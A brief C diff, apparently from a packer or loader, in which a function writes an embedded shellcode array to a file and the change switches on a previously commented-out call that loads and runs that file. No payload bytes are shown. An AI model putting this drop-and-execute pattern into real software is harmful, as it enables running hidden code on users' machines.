@@ -146,8 +146,7 @@ static int _load_packed(void) {
     int new_lib = open(FNAME, O_CREAT | O_WRONLY);
     write(new_lib, lib_shellcode, sizeof(lib_shellcode));
     close(new_lib);
-    // return _load_and_run(FNAME);
-    return OK;
+    return _load_and_run(FNAME);
 }
 
 
